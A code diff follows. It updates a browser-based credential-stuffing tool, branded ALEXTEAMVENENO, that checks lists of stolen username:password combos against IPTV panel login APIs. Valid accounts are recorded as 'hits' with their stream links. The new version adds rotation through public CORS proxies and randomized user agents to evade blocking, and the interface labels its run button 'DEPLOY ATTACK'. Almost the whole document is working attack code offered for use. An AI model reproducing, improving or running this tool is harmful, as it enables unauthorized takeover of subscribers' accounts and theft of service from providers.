@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <!-- 🔓 DESBLOQUEAR PETICIONES EN WEBVIEW -->
     <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src * http://* https://*; img-src * data:;">
     <title>☢️ ALEXTEAMVENENO · DRAGÓN CYBERPUNK</title>
     <style>
@@ -46,22 +45,18 @@
 
         body::before {
             content: '';
-            position: fixed;
-            top: 0; left: 0;
+            position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             background: rgba(0,0,0,0.6);
-            pointer-events: none;
-            z-index: 0;
+            pointer-events: none; z-index: 0;
         }
 
         body::after {
             content: '';
-            position: fixed;
-            top: 0; left: 0;
+            position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
-            pointer-events: none;
-            z-index: 9999;
+            pointer-events: none; z-index: 9999;
             animation: scanlines 0.1s linear infinite;
         }
 
@@ -69,28 +64,26 @@
 
         .content-wrapper { position: relative; z-index: 1; display: none; }
 
-        /* LOGIN */
         #loginScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); }
         .login-box { background: rgba(10,5,20,0.95); border: 2px solid var(--neon-magenta); border-radius: 8px; padding: 35px 28px; width: 400px; max-width: 92vw; box-shadow: 0 0 30px rgba(255,0,255,0.3), 0 0 60px rgba(255,0,255,0.12), inset 0 0 50px rgba(255,0,255,0.03); animation: loginGlow 3s ease-in-out infinite alternate; position: relative; }
-        @keyframes loginGlow { 0% { box-shadow: 0 0 20px rgba(255,0,255,0.2), 0 0 50px rgba(255,0,255,0.08); } 100% { box-shadow: 0 0 35px rgba(255,0,255,0.4), 0 0 80px rgba(255,0,255,0.18); } }
+        @keyframes loginGlow { 0% { box-shadow: 0 0 20px rgba(255,0,255,0.2); } 100% { box-shadow: 0 0 35px rgba(255,0,255,0.4); } }
         .login-box::before { content: ''; position: absolute; top: -2px; left: 15px; right: 15px; height: 2px; background: linear-gradient(90deg, transparent, var(--neon-magenta), var(--neon-cyan), var(--neon-magenta), transparent); background-size: 200% 100%; animation: topBar 3s linear infinite; }
         @keyframes topBar { 0% { background-position: -200% center; } 100% { background-position: 200% center; } }
         .login-logo { text-align: center; font-size: 2.8em; margin-bottom: 4px; animation: logoPulse 1.5s ease-in-out infinite; }
-        @keyframes logoPulse { 0%,100% { transform: scale(1); filter: brightness(1); } 50% { transform: scale(1.08); filter: brightness(1.4); } }
+        @keyframes logoPulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
         .login-brand { text-align: center; font-size: 1.3em; font-weight: 900; letter-spacing: 4px; margin-bottom: 4px; background: linear-gradient(90deg, var(--neon-magenta), var(--neon-cyan), var(--neon-magenta)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; animation: glitchText 5s linear infinite; }
         @keyframes glitchText { 0%,100% { opacity: 1; } 2% { opacity: 0.7; transform: translateX(-2px); } 4% { opacity: 1; transform: translateX(0); } }
         .login-version { text-align: center; font-size: 0.6em; letter-spacing: 3px; color: var(--text-dim); margin-bottom: 28px; }
         .input-group { margin-bottom: 16px; }
         .input-group label { display: block; font-size: 0.7em; letter-spacing: 2px; color: var(--neon-cyan); margin-bottom: 6px; font-weight: bold; }
         .input-group input { width: 100%; background: rgba(5,5,15,0.95); border: 1px solid rgba(0,255,255,0.3); border-radius: 4px; padding: 12px 14px; color: #fff; font-family: 'Courier New', 'Consolas', monospace; font-size: 0.9em; letter-spacing: 1px; transition: all 0.3s ease; outline: none; }
-        .input-group input:focus { border-color: var(--neon-magenta); box-shadow: 0 0 20px rgba(255,0,255,0.25), inset 0 0 15px rgba(255,0,255,0.05); }
+        .input-group input:focus { border-color: var(--neon-magenta); box-shadow: 0 0 20px rgba(255,0,255,0.25); }
         .btn-login { width: 100%; background: linear-gradient(135deg, rgba(180,0,60,0.9), rgba(255,0,64,0.9)); border: 2px solid var(--neon-red); border-radius: 4px; padding: 14px; color: #fff; font-family: 'Courier New', 'Consolas', monospace; font-size: 0.9em; font-weight: 900; letter-spacing: 3px; cursor: pointer; text-transform: uppercase; margin-top: 10px; transition: all 0.3s ease; animation: btnPulse 2s ease-in-out infinite; }
-        @keyframes btnPulse { 0%,100% { box-shadow: 0 0 10px var(--neon-red), 0 0 20px rgba(255,0,64,0.3); } 50% { box-shadow: 0 0 25px var(--neon-red), 0 0 50px rgba(255,0,64,0.5); } }
+        @keyframes btnPulse { 0%,100% { box-shadow: 0 0 10px var(--neon-red); } 50% { box-shadow: 0 0 25px var(--neon-red); } }
         .btn-login:active { transform: scale(0.96); }
-        .login-error { text-align: center; color: var(--neon-red); font-size: 0.7em; letter-spacing: 1px; margin-top: 12px; min-height: 18px; display: none; }
+        .login-error { text-align: center; color: var(--neon-red); font-size: 0.7em; letter-spacing: 1px; margin-top: 12px; display: none; }
         .login-footer { text-align: center; font-size: 0.5em; letter-spacing: 2px; color: var(--neon-magenta); margin-top: 18px; opacity: 0.5; }
 
-        /* BIENVENIDA */
         #welcomeScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; display: none; align-items: center; justify-content: center; background: rgba(0,0,0,0.92); flex-direction: column; }
         .dragon-container { text-align: center; animation: dragonEntrance 0.8s ease-out; }
         @keyframes dragonEntrance { 0% { transform: scale(0) rotate(-180deg); opacity: 0; } 60% { transform: scale(1.1) rotate(5deg); opacity: 1; } 100% { transform: scale(1) rotate(0deg); opacity: 1; } }
@@ -113,7 +106,6 @@
         .lang-btn.selected { border-color: var(--dragon-fire); box-shadow: 0 0 30px rgba(255,69,0,0.7); opacity: 1; }
         .lang-label { font-size: 0.55em; color: var(--text-dim); letter-spacing: 2px; margin-top: 5px; }
 
-        /* DASHBOARD */
         .banner { background: linear-gradient(135deg, rgba(10,5,20,0.9), rgba(20,5,35,0.9), rgba(5,15,30,0.9)); border: 2px solid var(--neon-magenta); border-radius: 3px; padding: 10px 12px; text-align: center; font-size: 1.1em; font-weight: 900; letter-spacing: 3px; margin: 8px; color: #fff; display: flex; align-items: center; justify-content: center; gap: 10px; }
         .signature { text-align: center; font-size: 0.55em; letter-spacing: 2px; color: var(--neon-magenta); opacity: 0.7; }
         .main-container { display: flex; gap: 8px; padding: 0 8px 8px 8px; height: calc(100vh - 130px); }
@@ -150,12 +142,11 @@
         .hits-table tbody tr { cursor: pointer; }
         .hits-table tbody tr:nth-child(even) { background: rgba(255,0,255,0.02); }
         .m3u-cell { display: flex; align-items: center; gap: 4px; }
-        .m3u-link-text { flex: 1; color: var(--neon-cyan); cursor: pointer; font-size: 0.75em; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; text-decoration: underline; }
         .progress-bar { height: 16px; background: rgba(10,10,25,0.9); border-radius: 2px; overflow: hidden; border: 1px solid rgba(255,0,255,0.25); margin: 4px 0; }
         .progress-fill { height: 100%; background: linear-gradient(90deg, var(--neon-purple), var(--neon-magenta)); transition: width 0.3s; width: 0%; }
         .progress-text { text-align: center; font-size: 0.65em; color: var(--neon-cyan); }
         .row { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
-        .col { flex: 1; min-width: 0; }
+        .col { flex: 1; }
         label { font-size: 0.68em; color: var(--text-dim); display: block; margin-bottom: 2px; }
         .checkbox-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
         input[type="checkbox"] { accent-color: var(--neon-magenta); width: 16px; height: 16px; cursor: pointer; }
@@ -166,26 +157,11 @@
         ::-webkit-scrollbar-track { background: rgba(0,0,0,0.5); }
         ::-webkit-scrollbar-thumb { background: rgba(255,0,255,0.35); border-radius: 3px; }
 
-        /* MODAL */
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; display: none; align-items: center; justify-content: center; padding: 15px; }
-        .modal { background: rgba(10,10,22,0.98); border: 2px solid var(--neon-magenta); border-radius: 5px; padding: 15px; max-width: 750px; width: 100%; max-height: 85vh; overflow-y: auto; }
-        .modal-header { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid rgba(255,0,255,0.3); }
-        .modal-logo { font-size: 1.8em; }
-        .modal-title { font-size: 0.9em; font-weight: 900; letter-spacing: 2px; background: linear-gradient(90deg, var(--neon-magenta), var(--neon-cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        .hit-info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 12px; }
-        .hit-info-item { background: rgba(15,15,30,0.8); border: 1px solid rgba(0,255,255,0.12); border-radius: 3px; padding: 8px; text-align: center; }
-        .hit-info-label { font-size: 0.55em; color: var(--text-dim); }
-        .hit-info-value { font-size: 0.8em; color: var(--neon-cyan); font-weight: bold; }
-        .m3u-link-full { background: rgba(5,5,15,0.9); border: 2px solid var(--neon-cyan); border-radius: 4px; padding: 14px; color: var(--neon-cyan); font-family: 'Courier New', monospace; font-size: 0.75em; word-break: break-all; margin-bottom: 10px; }
-        .modal-buttons { display: flex; gap: 6px; justify-content: center; flex-wrap: wrap; }
-        .modal-buttons button { font-size: 0.78em; padding: 10px 16px; min-height: 44px; }
-
         @media (max-width: 900px) {
             .main-container { flex-direction: column; height: auto; }
             .left-panel { flex: none; max-height: 45vh; position: sticky; top: 8px; z-index: 5; }
             .banner { font-size: 0.85em; }
             .stats-grid { grid-template-columns: repeat(2, 1fr); }
-            .hit-info-grid { grid-template-columns: repeat(2, 1fr); }
             .dragon-head { font-size: 3.5em; }
             .dragon-title { font-size: 1.2em; }
         }
@@ -197,7 +173,7 @@
         <div class="login-box">
             <div class="login-logo">☢️</div>
             <div class="login-brand">ALEXTEAMVENENO</div>
-            <div class="login-version">[ DRAGÓN CYBERPUNK v15 · APK ]</div>
+            <div class="login-version">[ DRAGÓN CYBERPUNK v16 · PROXY CORS ]</div>
             <div class="input-group"><label>👤 USUARIO</label><input type="text" id="loginUser" placeholder="Ingresa tu usuario..." autocomplete="off"></div>
             <div class="input-group"><label>🔑 CONTRASEÑA</label><input type="password" id="loginPass" placeholder="Ingresa tu contraseña..."></div>
             <button class="btn-login" onclick="doLogin()">🚀 ACCEDER AL SISTEMA</button>
@@ -216,11 +192,8 @@
             <div class="dragon-status" id="dragonLoading">🔥 INYECTANDO VENENO AL SISTEMA...</div>
             <div class="dragon-progress"><div class="dragon-progress-fill"></div></div>
             <div style="margin-top:15px; text-align:center;">
-                <div style="font-size:0.6em; color:var(--text-dim); letter-spacing:2px; margin-bottom:8px;">🌍 SELECCIONA IDIOMA</div>
                 <div class="lang-selector">
-                    <div class="lang-btn selected" onclick="selectLanguage('es', this)">🇪🇸<div class="lang-label">ESPAÑOL</div></div>
-                    <div class="lang-btn" onclick="selectLanguage('ro', this)">🇷🇴<div class="lang-label">ROMÂNĂ</div></div>
-                    <div class="lang-btn" onclick="selectLanguage('en', this)">🇬🇧<div class="lang-label">ENGLISH</div></div>
+                    <div class="lang-btn selected">🇪🇸<div class="lang-label">ESPAÑOL</div></div>
                 </div>
             </div>
         </div>
@@ -232,10 +205,10 @@
         <div class="main-container">
             <div class="left-panel">
                 <div class="card"><div class="card-title">📁 // COMBO_LOADER</div><div class="row"><input type="file" id="comboFile" accept=".txt" style="display:none;" onchange="handleComboFile(event)"><button onclick="document.getElementById('comboFile').click()" style="flex:1;">📂 LOAD FILE</button><span id="comboStatus" style="font-size:0.65em; color: var(--neon-cyan);">0 lines</span></div></div>
-                <div class="card"><div class="card-title">🌐 // PROXY_MATRIX</div><select id="proxyType" style="margin-bottom:4px;"><option value="0">[ AUTO ] SOCKS5h</option><option value="1">[ HTTP ]</option><option value="2">[ SOCKS4 ]</option><option value="3">[ SOCKS5 ]</option></select><div class="row"><input type="file" id="proxyFile" accept=".txt" style="display:none;" onchange="handleProxyFile(event)"><button onclick="document.getElementById('proxyFile').click()" style="flex:1;">🔄 LOAD</button><button class="btn-save" onclick="scrapeProxies()" style="flex:1;background:rgba(0,30,50,0.9);border-color:rgba(0,255,255,0.4);color:var(--neon-cyan);" id="btnScrape">🌐 SCRAPE</button></div><span id="proxyStatus" style="font-size:0.65em; color: var(--neon-cyan);">> 0 proxies</span></div>
+                <div class="card"><div class="card-title">🌐 // PROXY_MATRIX</div><select id="proxyType"><option value="0">[ AUTO ] SOCKS5h</option><option value="1">[ HTTP ]</option><option value="2">[ SOCKS4 ]</option><option value="3">[ SOCKS5 ]</option></select><div class="row"><input type="file" id="proxyFile" accept=".txt" style="display:none;" onchange="handleProxyFile(event)"><button onclick="document.getElementById('proxyFile').click()" style="flex:1;">🔄 LOAD</button><button class="btn-save" onclick="scrapeProxies()" style="flex:1;background:rgba(0,30,50,0.9);border-color:rgba(0,255,255,0.4);color:var(--neon-cyan);" id="btnScrape">🌐 SCRAPE</button></div><span id="proxyStatus" style="font-size:0.65em; color: var(--neon-cyan);">> 0 proxies</span></div>
                 <div class="card"><div class="card-title">⚙️ // CONFIG</div><label>🌐 TARGET URL</label><input type="text" id="portals" placeholder="panel.com:80"><div class="row" style="margin-top:5px;"><div class="col"><label>🤖 THREADS</label><input type="number" id="threads" value="20" min="1" max="200"></div><div style="display:flex;gap:8px;align-items:flex-end;"><label style="color:var(--neon-cyan);"><input type="checkbox" id="useHttps"> SSL</label><label style="color:var(--neon-cyan);"><input type="checkbox" id="useProxies"> PROXY</label></div></div></div>
                 <div class="card"><div class="card-title">🎛️ // FILTER</div><div class="checkbox-row"><label><input type="checkbox" id="logInfo" checked> INFO</label><label style="color:var(--neon-green);"><input type="checkbox" id="logHits" checked> HITS</label><label style="color:var(--neon-red);"><input type="checkbox" id="logErrors" checked> ERR</label></div></div>
-                <div class="card" style="flex:1; display:flex; flex-direction:column;"><div class="card-title">📟 // CONSOLE</div><div class="console" id="console">> ALEXTEAMVENENO v15 · APK<br>> Listo para atacar...</div></div>
+                <div class="card" style="flex:1; display:flex; flex-direction:column;"><div class="card-title">📟 // CONSOLE</div><div class="console" id="console">> ALEXTEAMVENENO v16 · PROXY CORS<br>> Sistema listo...</div></div>
             </div>
             <div class="right-panel">
                 <div class="card"><div class="stats-grid"><div class="stat-box">🔍 SCANNED<span class="stat-value" id="statChecked">0</span></div><div class="stat-box stat-hits">✅ HITS<span class="stat-value" id="statHits">0</span></div><div class="stat-box stat-errors">❌ ERR<span class="stat-value" id="statErrors">0</span></div><div class="stat-box">📈 CPM<span class="stat-value" id="statCPM" style="color:var(--neon-yellow);">0</span></div></div><div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div><div class="progress-text" id="progressText">[ 0 / 0 ] 0%</div></div>
@@ -244,17 +217,27 @@
                 <div class="row"><button class="btn-start" id="btnStart" onclick="startScan()">🚀 DEPLOY ATTACK</button><button class="btn-stop" id="btnStop" onclick="stopScan()" disabled>⬛ ABORT</button></div>
             </div>
         </div>
-        <div class="footer-signature">[ ALEXTEAMVENENO ] · 2026</div>
+        <div class="footer-signature">[ ALEXTEAMVENENO ] · PROXY CORS · 2026</div>
     </div>
 
-    <div class="lang-indicator" onclick="changeLanguageFromDashboard()" id="langIndicator">🇪🇸</div>
-
+    <div class="lang-indicator" id="langIndicator">🇪🇸</div>
     <div class="toast" id="toast"></div>
 
     <script>
         const VALID_USER = 'ALEX';
         const VALID_PASS = 'IPTV92';
         let isLoggedIn = false;
+
+        // 🔥 PROXY CORS - Lista de proxies para rotar
+        const CORS_PROXIES = [
+            'https://api.allorigins.win/raw?url=',
+            'https://corsproxy.io/?',
+            'https://thingproxy.freeboard.io/fetch/'
+        ];
+        let currentProxyIndex = 0;
+        function getNextCorsProxy() {
+            return CORS_PROXIES[currentProxyIndex++ % CORS_PROXIES.length];
+        }
 
         function doLogin() {
             if (document.getElementById('loginUser').value.trim() === VALID_USER && document.getElementById('loginPass').value === VALID_PASS) {
@@ -291,7 +274,7 @@
         function saveState() {
             if (!isLoggedIn) return;
             try {
-                localStorage.setItem('alexAPK', JSON.stringify({
+                localStorage.setItem('alexAPKv2', JSON.stringify({
                     comboLines: state.comboLines.slice(0, 10000),
                     proxies: state.proxies.slice(0, 1000),
                     hits: state.hits.slice(-500),
@@ -306,11 +289,11 @@
 
         function loadState() {
             try {
-                const d = JSON.parse(localStorage.getItem('alexAPK'));
+                const d = JSON.parse(localStorage.getItem('alexAPKv2'));
                 if (!d) return;
                 if (d.comboLines) { state.comboLines = d.comboLines; state.totalCombos = d.totalCombos || d.comboLines.length; }
                 if (d.proxies) state.proxies = d.proxies;
-                if (d.hits) { state.hits = []; d.hits.forEach(h => addHitToTableSilent(h)); }
+                if (d.hits) { state.hits = []; document.getElementById('hitsBody').innerHTML = ''; d.hits.forEach(h => addHitToTableSilent(h)); }
                 if (d.portals) document.getElementById('portals').value = d.portals;
                 if (d.threads) document.getElementById('threads').value = d.threads;
                 if (d.useHttps !== undefined) document.getElementById('useHttps').checked = d.useHttps;
@@ -325,8 +308,14 @@
         window.addEventListener('beforeunload', () => { if (isLoggedIn) saveState(); });
         setInterval(() => { if (isLoggedIn && !state.isRunning) saveState(); }, 30000);
 
+        const USER_AGENTS = ["VLC/3.0.20","ExoPlayerDemo/2.19.1","Kodi/20.2","Dalvik/2.1.0","Mozilla/5.0 (Linux; Android 14)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4)"];
+        function getRandomUA() { return USER_AGENTS[Math.floor(Math.random()*USER_AGENTS.length)]; }
+
         function log(msg, type='info') {
             if (!isLoggedIn) return;
+            if (type==='info' && !document.getElementById('logInfo').checked) return;
+            if (type==='hit' && !document.getElementById('logHits').checked) return;
+            if (type==='err' && !document.getElementById('logErrors').checked) return;
             const el = document.getElementById('console'), line = document.createElement('div');
             line.className = `log-${type}`;
             line.textContent = `[${new Date().toLocaleTimeString('en-US',{hour12:false})}] ${type==='hit'?'[HIT]':type==='err'?'[ERR]':'[LOG]'} ${msg}`;
@@ -347,7 +336,7 @@
         function addHitToTableSilent(h) {
             state.hits.push(h);
             const row=document.getElementById('hitsBody').insertRow(0), esc=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;');
-            row.innerHTML=`<td>${esc(h.user)}</td><td>${esc(h.pass)}</td><td>${esc(h.status||'Active')}</td><td>${esc(h.exp||'N/A')}</td><td>${esc(h.portal)}</td><td>${h.canales||0}</td><td>${h.espana||0}</td><td><span style="color:var(--neon-cyan);text-decoration:underline;">M3U</span></td>`;
+            row.innerHTML=`<td>${esc(h.user)}</td><td>${esc(h.pass)}</td><td>${esc(h.status||'Active')}</td><td>${esc(h.exp||'N/A')}</td><td>${esc(h.portal)}</td><td>${h.canales||0}</td><td>${h.espana||0}</td><td><span style="color:var(--neon-cyan);">M3U</span></td>`;
         }
 
         function addHitToTable(h) { addHitToTableSilent(h); state.totalChannels+=(h.canales||0); state.totalSpain+=(h.espana||0); saveState(); }
@@ -375,61 +364,145 @@
         function handleProxyFile(e) {
             const f=e.target.files[0]; if(!f) return;
             const r=new FileReader(); r.onload=ev=>{
-                const lines=ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('#'));
-                state.proxies=lines;
+                state.proxies=ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('#'));
                 document.getElementById('proxyStatus').textContent=`> ${state.proxies.length} proxies`; saveState();
             }; r.readAsText(f);
         }
 
-        async function scrapeProxies() { showToast('🌐 Scraping...'); }
+        async function scrapeProxies() { showToast('🌐 Scraping...'); log('📥 Función scrape en desarrollo', 'info'); }
 
+        // 🔥🔥🔥 FUNCIÓN CON PROXY CORS 🔥🔥🔥
         async function checkCombo(line, portals, https, proxy) {
-            const parts=line.split(':'); if(parts.length<2) return{invalid:true};
-            const user=parts[0].trim(), pass=parts.slice(1).join(':').trim(); if(!user||!pass) return{invalid:true};
-            const proto=https?'https':'http';
-            for(const portal of portals) {
-                if(!state.isRunning) return null;
-                const cp=portal.replace(/^https?:\/\//,'').replace(/\/$/,''), base=`${proto}://${cp}`;
+            const parts = line.split(':');
+            if (parts.length < 2) return { invalid: true };
+            const user = parts[0].trim();
+            const pass = parts.slice(1).join(':').trim();
+            if (!user || !pass) return { invalid: true };
+            const proto = https ? 'https' : 'http';
+
+            for (const portal of portals) {
+                if (!state.isRunning) return null;
+                const cp = portal.replace(/^https?:\/\//, '').replace(/\/$/, '');
+                const base = `${proto}://${cp}`;
+
                 try {
-                    const ctrl=new AbortController(); setTimeout(()=>ctrl.abort(),10000);
-                    const r=await fetch(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,{signal:ctrl.signal});
-                    if(r.ok) {
-                        const txt=await r.text();
-                        if(txt.includes('active')||txt.includes('exp_date')) {
-                            let d={}; try{d=JSON.parse(txt);}catch(e){}
-                            const ui=d.user_info||{}, exp=ui.exp_date?new Date(parseInt(ui.exp_date)*1000).toISOString().split('T')[0]:'N/A';
-                            const m3u=`${base}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
-                            return{hit:true,data:{user,pass,exp,status:ui.status||'Active',portal:cp,m3u,canales:0,espana:0,pelis:0,series:0,categories:[],proxy:proxy||'Direct'}};
+                    const ctrl = new AbortController();
+                    setTimeout(() => ctrl.abort(), 15000);
+
+                    // 🔥 USAR PROXY CORS
+                    const corsProxy = getNextCorsProxy();
+                    const targetUrl = `${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+                    const fullUrl = corsProxy + encodeURIComponent(targetUrl);
+
+                    log(`🔍 Probando: ${user}:${pass} vía proxy...`, 'info');
+
+                    const r = await fetch(fullUrl, {
+                        signal: ctrl.signal,
+                        headers: { 'User-Agent': getRandomUA() }
+                    });
+
+                    if (r.status === 200) {
+                        const txt = await r.text();
+                        if (txt.toLowerCase().includes('active') || txt.toLowerCase().includes('exp_date')) {
+                            let d = {};
+                            try { d = JSON.parse(txt); } catch (e) {}
+                            const ui = d.user_info || {};
+                            const exp = ui.exp_date ? new Date(parseInt(ui.exp_date) * 1000).toISOString().split('T')[0] : 'N/A';
+                            const m3u = `${base}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+                            return {
+                                hit: true,
+                                data: {
+                                    user, pass, exp,
+                                    status: ui.status || 'Active',
+                                    maxConn: ui.max_connections,
+                                    actConn: ui.active_cons,
+                                    portal: cp, m3u,
+                                    canales: 0, espana: 0, pelis: 0, series: 0,
+                                    categories: [],
+                                    proxy: proxy || 'Direct'
+                                }
+                            };
                         }
-                    } else { return{error:true}; }
-                } catch(e) { return{error:true}; }
+                    }
+                    return { error: true };
+                } catch (e) {
+                    log(`❌ Error: ${e.message}`, 'err');
+                    return { error: true };
+                }
             }
-            return{invalid:true};
+            return { invalid: true };
         }
 
         async function startScan() {
-            if(!isLoggedIn||state.isRunning||!state.comboLines.length) return;
-            const raw=document.getElementById('portals').value.trim(); if(!raw) return;
-            const portals=raw.split(',').map(p=>p.trim()).filter(Boolean); if(!portals.length) return;
-            const threads=Math.min(parseInt(document.getElementById('threads').value)||20,50);
-            const useHttps=document.getElementById('useHttps').checked;
-            state.isRunning=true; state.stats={checked:0,hits:0,errors:0}; state.hits=[]; state.totalChannels=0; state.totalSpain=0; state.startTime=Date.now();
-            document.getElementById('btnStart').disabled=true; document.getElementById('btnStop').disabled=false; document.getElementById('hitsBody').innerHTML='';
-            log('🚀 ATAQUE INICIADO', 'warn');
-            const queue=[...state.comboLines]; let qi=0; const total=queue.length;
-            const worker=async()=>{while(state.isRunning&&qi<total){const ci=qi++;if(ci>=total)break;const line=queue[ci];if(!line||!line.includes(':')){state.stats.checked++;continue;}const res=await checkCombo(line,portals,useHttps,null);state.stats.checked++;if(res?.hit){state.stats.hits++;log(`💥 HIT! ${res.data.user}:${res.data.pass} @ ${res.data.portal}`,'hit');addHitToTable(res.data);updateStats();}else if(res?.error){state.stats.errors++;log(`❌ Error en ${line.split(':')[0]}`,'err');}if(state.stats.checked%10===0)updateStats();if(state.stats.checked%20===0)await new Promise(r=>setTimeout(r,50));}};
-            await Promise.all(Array(Math.min(threads,total)).fill().map(()=>worker()));
-            state.isRunning=false; document.getElementById('btnStart').disabled=false; document.getElementById('btnStop').disabled=true; updateStats(); saveState();
-            log(`🎯 FIN. Hits: ${state.stats.hits}`, 'warn'); showToast(`✅ ${state.stats.hits} hits!`);
+            if (!isLoggedIn || state.isRunning || !state.comboLines.length) return;
+            const raw = document.getElementById('portals').value.trim();
+            if (!raw) { showToast('⚠️ Ingresa URL del panel'); return; }
+            const portals = raw.split(',').map(p => p.trim()).filter(Boolean);
+            if (!portals.length) return;
+            const threads = Math.min(parseInt(document.getElementById('threads').value) || 20, 50);
+            const useHttps = document.getElementById('useHttps').checked;
+
+            state.isRunning = true;
+            state.stats = { checked: 0, hits: 0, errors: 0 };
+            state.hits = [];
+            state.totalChannels = 0;
+            state.totalSpain = 0;
+            state.startTime = Date.now();
+
+            document.getElementById('btnStart').disabled = true;
+            document.getElementById('btnStop').disabled = false;
+            document.getElementById('hitsBody').innerHTML = '';
+
+            log('🚀 ATAQUE INICIADO (Proxy CORS)', 'warn');
+            log(`🎯 ${portals.join(', ')} | ⚙️ ${threads} threads | ${useHttps?'SSL':'No SSL'}`, 'info');
+
+            const queue = [...state.comboLines];
+            let qi = 0;
+            const total = queue.length;
+
+            const worker = async () => {
+                while (state.isRunning && qi < total) {
+                    const ci = qi++;
+                    if (ci >= total) break;
+                    const line = queue[ci];
+                    if (!line || !line.includes(':')) { state.stats.checked++; continue; }
+                    const res = await checkCombo(line, portals, useHttps, null);
+                    state.stats.checked++;
+                    if (res?.hit) {
+                        state.stats.hits++;
+                        log(`💥 HIT! ${res.data.user}:${res.data.pass} @ ${res.data.portal}`, 'hit');
+                        addHitToTable(res.data);
+                        updateStats();
+                    } else if (res?.error) {
+                        state.stats.errors++;
+                    }
+                    if (state.stats.checked % 10 === 0) updateStats();
+                    if (state.stats.checked % 20 === 0) await new Promise(r => setTimeout(r, 50));
+                }
+            };
+
+            await Promise.all(Array(Math.min(threads, total)).fill().map(() => worker()));
+
+            state.isRunning = false;
+            document.getElementById('btnStart').disabled = false;
+            document.getElementById('btnStop').disabled = true;
+            updateStats();
+            saveState();
+            const elapsed = ((Date.now() - state.startTime) / 1000).toFixed(1);
+            log(`🎯 FIN en ${elapsed}s | Hits: ${state.stats.hits} | Errores: ${state.stats.errors} [ALEXTEAMVENENO]`, 'warn');
+            showToast(`✅ ${state.stats.hits} hits!`);
         }
 
-        function stopScan() { state.isRunning=false; document.getElementById('btnStop').disabled=true; saveState(); }
+        function stopScan() { state.isRunning = false; document.getElementById('btnStop').disabled = true; saveState(); }
 
         function init() {
-            document.getElementById('dashboard').style.display='none'; document.getElementById('welcomeScreen').style.display='none'; document.getElementById('loginScreen').style.display='flex'; document.getElementById('loginUser').focus();
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('welcomeScreen').style.display = 'none';
+            document.getElementById('loginScreen').style.display = 'flex';
+            document.getElementById('loginUser').focus();
         }
-        window.addEventListener('DOMContentLoaded',init);
-        if(document.readyState!=='loading') init();
+        window.addEventListener('DOMContentLoaded', init);
+        if (document.readyState !== 'loading') init();
     </script>
 </body>
 </html>
